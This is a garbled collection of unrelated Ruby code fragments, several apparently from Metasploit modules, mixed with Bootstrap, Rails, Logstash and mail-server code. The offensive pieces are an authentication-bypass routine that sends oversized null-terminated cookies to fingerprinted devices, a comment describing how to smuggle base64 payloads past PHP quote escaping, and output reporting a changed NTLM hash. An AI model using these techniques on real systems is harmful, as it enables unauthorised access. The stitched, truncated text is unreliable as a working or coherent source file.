
        
            # PHP escapes quotes by default with magic_quotes_gpc, so we use some
    # tricks to get around using them.
    #
    # The raw, unquoted base64 without the terminating equals works because
    # PHP treats it like a string.  There are, however, a couple of caveats
    # because first, PHP tries to parse the bare string as a constant.
    # Because of this, the string is limited to things that can be
    # identifiers, i.e., things that start with [a-zA-Z] and contain only
    # [a-zA-Z0-9_].  Also, for payloads that encode to more than 998
    # characters, only part of the payload gets unencoded on the victim,
    # presumably due to a limitation in PHP identifier name lengths, so we
    # break the encoded payload into roughly 900-byte chunks.
    #
    # https://wiki.php.net/rfc/deprecate-bareword-strings
    
      #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end
    
      def run
    res = send_request_raw(
        'uri' => normalize_uri(target_uri.path.to_s),
        'method' => 'GET',
    )
    model = check_response_fingerprint(res, Exploit::CheckCode::Detected)
    if model != Exploit::CheckCode::Detected
      devices = devices_list[model.to_sym]
      devices = devices_list['ALL'.to_sym] if devices.nil? && datastore['ForceAttempt']
      if devices != nil
        print_good('Detected device:#{devices[:name]} #{devices[:model]}')
        devices[:values].each { |value|
          cookie = 'C#{value[0]}=#{'B'*value[1]}\x00'
          res = send_request_raw(
              'uri' => normalize_uri(target_uri.path.to_s),
              'method' => 'GET',
              'headers' => headers.merge('Cookie' => cookie)
          )
          if res != nil and res.code <= 302
            print_good('Good response, please check host, authentication should be disabled')
            break
          else
            print_error('Bad response')
          end
        }
      else
        print_error('No matching values for fingerprint #{model}')
      end
    else
      print_error('Unknown device')
    end
  end
end

    
        vars_get = {'value' => go_go_gadget2}
    
          if result[:success] == true
        print_good('Success! New NTLM hash: #{result[:new]}')
      else
        print_error('Failed! #{result[:error]}')
      end
    end
  end
    
        if sysinfo['Architecture'] == ARCH_X64 && target.arch.first == ARCH_X86
      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')
    elsif sysinfo['Architecture'] == ARCH_X86 && target.arch.first == ARCH_X64
      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')
    end
    
          spec['version'] = Bootstrap::VERSION
    
      def initialize(repo: 'twbs/bootstrap', branch: 'master', save_to: {}, cache_path: 'tmp/converter-cache-bootstrap')
    @logger     = Logger.new
    @repo       = repo
    @branch     = branch || 'master'
    @branch_sha = get_branch_sha
    @cache_path = cache_path
    @repo_url   = 'https://github.com/#@repo'
    @save_to    = {
        js:    'assets/javascripts/bootstrap',
        scss:  'assets/stylesheets/bootstrap',
        fonts: 'assets/fonts/bootstrap'}.merge(save_to)
  end
    
      # The test environment is used exclusively to run your application's
  # test suite. You never need to work with it otherwise. Remember that
  # your test database is 'scratch space' for the test suite and is wiped
  # and recreated between test runs. Don't rely on the data there!
  config.cache_classes = true
    
    require 'clamp'
require 'pluginmanager/util'
require 'pluginmanager/gemfile'
require 'pluginmanager/install'
require 'pluginmanager/remove'
require 'pluginmanager/list'
require 'pluginmanager/update'
require 'pluginmanager/pack'
require 'pluginmanager/unpack'
require 'pluginmanager/generate'
require 'pluginmanager/prepare_offline_pack'
require 'pluginmanager/proxy_support'
configure_proxy
    
        context 'when is not a system pipeline' do
      it 'returns false if the pipeline is not a system pipeline' do
        expect(subject.system?).to be_falsey
      end
    end
  end
end

    
      action :raw do
    title 'Send a raw RFC2882 message'
    description 'This action allows you to send us a raw RFC2822 formatted message along with the recipients that it should be sent to. This is similar to sending a message through our SMTP service.'
    param :mail_from, 'The address that should be logged as sending the message', :type => String, :required => true
    param :rcpt_to, 'The addresses this message should be sent to', :type => Array, :required => true
    param :data, 'A base64 encoded RFC2822 message to send', :type => String, :required => true
    param :bounce, 'Is this message a bounce?', :type => :boolean
    returns Hash
    error 'UnauthenticatedFromAddress', 'The From address is not authorised to send mail from this server'
    action do
      # Decode the raw message
      raw_message = Base64.decode64(params.data)
    
      end
end

    
      def create
    @ip_address = @ip_pool.ip_addresses.build(safe_params)
    if @ip_address.save
      redirect_to_with_json [:edit, @ip_pool]
    else
      render_form_errors 'new', @ip_address
    end
  end
    
      def framework_version
    @framework_version ||= `rails -v`[/^Rails (.+)$/, 1]
  end
    
            def define_boolean_in_mod(mod)
          return if defined? mod::Boolean
          mod.const_set('Boolean', Virtus::Attribute::Boolean)
        end
    
          # @param key [Symbol]
      # @param value [Object]
      # @return (see #get_or_set)
      def global_setting(key, value = nil)
        get_or_set :global, key, value
      end